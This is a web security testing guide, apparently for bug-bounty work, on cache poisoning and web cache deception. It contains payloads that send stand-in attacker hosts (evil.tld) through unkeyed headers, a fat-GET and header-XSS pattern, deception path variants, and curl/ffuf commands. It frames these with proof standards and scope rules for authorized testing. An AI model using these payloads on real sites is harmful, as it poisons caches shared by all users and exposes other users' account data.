# Cache Poisoning & Deception

> Caches sit between you and the user. Poisoning changes what they receive;
> deception makes the cache serve *your* request's response to *them*. Both are
> high-severity because the victim never triggers anything.

## The model

```
request ──► cache ──► origin
              │
              └── key = (path [+ selected headers])
```

The cache decides what to key on. Anything that *influences the response* but is
*not in the key* is poisonable. That single sentence is the whole discipline.

## Phase 1 — learn the cache's key

Send the same request twice and diff, then vary one thing at a time:

| Probe | Meaning |
|---|---|
| `X-Forwarded-Host: <attacker>` | response links/assets rewrite → HFH poisons |
| `X-Forwarded-Scheme: http` | redirects generated from scheme |
| `X-Original-URL: /admin` | routing overrides — itself an auth bypass |
| `X-Rewrite-URL: /admin` | same, some stacks |
| `X-Forwarded-For: <x>` | reflected into responses or keys |
| `X-Host`, `X-HTTP-Host-Override` | alternate host headers |
| `Forwarded: for=...;host=...` | RFC 7239 form |
| second `Host:` header | some stacks take the last |
| absolute URI in the request line | `GET http://evil/ HTTP/1.1` |
| `:path` pseudo-header (HTTP/2) | prefix-override attacks |

Unkeyed-but-reflected headers are the surface. `Param Miner` (Burp) automates
header/param discovery; `arjun` finds unkeyed parameters.

### Unkeyed parameters

Same idea for query parameters: `?utm_content=<x>` reflected but not keyed. If
the reflection lands in the cached response, the parameter poisons.

## Phase 2 — poisoning patterns

| Pattern | Mechanism | Payload shape |
|---|---|---|
| Host header injection | unkeyed host → generated links | `X-Forwarded-Host: evil.tld` then victim gets `src=//evil.tld/x.js` |
| Fat GET | body on a GET is cached for the URL | `GET /page HTTP/1.1\r\nContent-Length: 25\r\n\r\ncallback=evil()` |
| Header-based XSS | unkeyed header reflected uncoded | `X-Forwarded-For: <script>...` |
| Cache key injection | delimiter confusion in keys | `?utm_content=x&::param=y` shapes |
| Web cache deception | victim's authenticated response cached under an attacker-chosen path | see below |
| Resource overwrite | two URLs map to one key | `//evil.tld//` normalization differences |

### Web cache deception (WCD)

The victim fetches a URL that the app serves *authenticated* but the cache treats
as a static asset:

```
attacker sends victim: https://target/account/settings/nonexistent.css
app returns the authenticated settings page
cache keys /account/settings/nonexistent.css and stores it
attacker fetches the same URL -> reads the victim's page
```

Detection: send the crafted URL as an authenticated user, then fetch it
unauthenticated. If the second fetch returns account content, the cache keys on
path and ignores auth.

Variants that trigger caching when `.css` alone does not:

```
/account/settings;.css      (semicolon — Java stacks)
/account/settings%0a.css    (newline)
/account/settings?.css      (query; some caches key whole URI)
/.css/account/settings      (prefix)
```

### Poison DoS (cache denial)

`X-Forwarded-Host` to an unresolvable host poisons the cached page into a broken
state for every visitor until expiry. Real impact, trivial payload — but most
programs class it as DoS-adjacent; demonstrate once and describe.

## Phase 3 — proof standard

| Claim | Evidence |
|---|---|
| poisoning | **two requests**: the poisoned one, then a *victim* fetch showing attacker content |
| deception | authenticated request stored, unauthenticated fetch returns it |
| header injection | response containing the injected header value, fetched fresh |

A poisoned cache in your own session proves nothing — show the unauthenticated or
victim-perspective fetch. That is what makes this class hard to fake and easy to
validate.

## Cache identification

| Header | Tells you |
|---|---|
| `X-Cache: HIT/MISS` | generic |
| `Age:` > 0 | response was cached |
| `CF-Cache-Status` | Cloudflare |
| `X-Varnish`, `X-Served-By: cache-*` | Varnish / Fastly |
| `X-Drupal-Cache`, `wp-super-cache` | app-level |
| `Via: 1.1 varnish` | Varnish |

## Tooling

```bash
# header discovery (unkeyed)
arjun -u https://target/page -m GET
# param mining is better in Burp (Param Miner); from CLI:
ffuf -w /opt/wordlists/params/all.txt -u "https://target/page?FUZZ=canary123" -fs <baseline>
# two-request verification by hand
curl -s -H 'X-Forwarded-Host: evil.tld' https://target/page > /dev/null
curl -s https://target/page | grep -c evil.tld     # >0 on a second fetch = cached
```

## Scope and safety

- Poisoning writes to the cache *every user shares*. Demonstrate once, then
  request purge or wait for TTL — do not keep re-poisoning.
- Prefer a poison payload that is obviously yours (`BAZ-<token>` in a comment)
  so operators can identify and purge.
- Cache deception reads *other users'* data. Save the smallest sample and treat
  it as sensitive data exposure — the adjudicator rates it accordingly.
- Never poison with content that would harm users (malware, defacement). Proof
  is a benign marker.

## Anti-patterns

- Proving poisoning by re-fetching yourself — cache may be disabled for your IP
- Reporting "X-Forwarded-Host reflected" without showing it cached
- WCD without the unauthenticated confirmation fetch
- Leaving a poisoned entry live through report writing
